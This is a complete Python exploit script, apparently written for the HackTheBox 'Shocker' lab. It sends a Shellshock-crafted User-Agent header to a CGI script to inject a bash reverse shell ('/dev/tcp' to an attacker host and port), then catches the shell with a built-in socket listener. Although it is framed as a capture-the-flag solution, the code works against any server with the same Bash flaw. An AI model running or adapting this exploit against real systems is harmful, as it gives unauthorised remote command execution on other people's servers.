#! /usr/bin/env python3

## Author: 0xEtern4lW0lf
## Created: 18 Dez 2022
## Description: GetShell - Shocker - HTB

## ========= MODULES =========

import argparse
import requests
import socket
import telnetlib
from threading import Thread

## ========= VARIABLE =========

## Set proxy [OPTIONAL]
#proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

## ========= FUNCTION =========

## Set the handler
def handler(lport,target):
    print(f"[+] Starting handler on {lport} [+]")
    tn = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0",lport))
    s.listen(1)
    conn, addr = s.accept()
    print(f"[+] Receiving connection from {target} [+]")
    tn.sock = conn
    print("[+] Habemus Shell! [+]")
    tn.interact()


## Get the reverse shell
def GetShell(rhost,lhost,lport):
    print("[+] Sending payload! [+]")
    payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    url = f"http://{rhost}/cgi-bin/user.sh"
    headers = {"User-Agent": "() { :;}; echo; /bin/bash -c '%s'" %payload}
    r = requests.session()
    r.get(url, headers=headers)


## main
def main():
    ## Parse Arguments
    parser = argparse.ArgumentParser()
    parser = argparse.ArgumentParser(description='GetShell - Shocker / HTB - 0xEtern4lW0lf')
    parser.add_argument('-t', '--target', help='Target IP address or hostname', required=True)
    parser.add_argument('-l', '--lhost', help='Local IP address or hostname', required=True)
    parser.add_argument('-p', '--lport', help='Local Port to receive the shell', required=True)

    args = parser.parse_args()

    rhost = args.target
    lhost = args.lhost
    lport = args.lport

    ## Setup the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()

    ## Get the reverse shell
    GetShell(rhost,lhost,lport)

## ======= EXECUTION =======

if __name__ == '__main__':
    main()
